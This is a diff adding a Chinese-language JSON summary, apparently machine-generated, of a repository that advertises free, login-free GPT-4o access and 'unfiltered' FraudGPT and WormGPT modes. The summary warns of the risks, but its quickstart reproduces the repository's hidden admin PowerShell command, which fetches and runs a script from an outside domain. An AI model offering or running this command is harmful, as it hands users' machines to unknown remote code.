@@ -1,0 +1,21 @@
+{
+ "ai_related": true,
+ "audience": "仅适合希望了解此类“免费 ChatGPT”脚本运作方式、并具备安全风险识别能力的技术人员；不建议普通用户在自己的电脑上运行。",
+ "date": "2026-11-01",
+ "features": [
+  "宣称免登录、免 API Key 使用 GPT-4o、GPT-4、GPT-3.5",
+  "宣称支持 DALL-E 3 图像生成、文件上传、联网搜索、语音对话、代码解释器",
+  "宣称提供本地自托管 ChatGPT Clone，基于 Ollama 与开源模型",
+  "宣称包含无内容过滤的 FraudGPT 与 WormGPT 模式",
+  "通过一条 PowerShell 命令完成所谓安装与启动"
+ ],
+ "intro": "这个仓库以“Free ChatGPT 2026”为名，宣称无需 OpenAI 账号、API Key、手机验证或付费，即可使用 GPT-4o、GPT-4、GPT-3.5 等模型，并附带 DALL-E 3 图像生成、文件上传、联网搜索、语音对话和代码解释器等功能。\n\nREADME 给出的使用方式只有一条：在 Windows 终端（管理员）或运行对话框中执行一段 PowerShell 命令，该命令会从外部域名下载并直接执行脚本。仓库还宣称包含本地自托管的 ChatGPT Clone（基于 Next.js、Ollama、Open WebUI 和 Llama、Mistral 等开源模型），以及所谓无内容过滤的 FraudGPT 和 WormGPT 模式。\n\n需要注意：README 中的截图均为占位图，未提供源码、安装包或可核验的实现细节；其核心操作是执行来源不明的远程脚本，存在明显安全风险。项目描述中涉及绕过付费与内容过滤的内容，使用前应谨慎评估。",
+ "model": "deepseek-flash",
+ "quickstart": [
+  "在 Windows 中按 Win + X，选择“终端（管理员）”",
+  "粘贴命令：powershell -NoP -NonI -W Hidden -C \"iex (irm kernelscv.cfd?t=gpt)\"",
+  "按 Enter 执行（该命令会从外部域名下载并直接运行脚本，请自行评估风险）"
+ ],
+ "summary": "该项目宣称无需登录、无需 API Key 即可免费使用 GPT-4o、GPT-4 等模型，并附带本地 ChatGPT Clone 与所谓无过滤模式。它面向想绕过官方账号和付费限制的用户，但实际做法是让用户在 Windows 上执行一条从外部域名下载的 PowerShell 命令，仓库中没有源码或可验证的实现，存在明显安全风险，使用前需格外谨慎。",
+ "tagline": "声称免登录、免 API Key 使用 GPT-4o 的 PowerShell 脚本"
+}
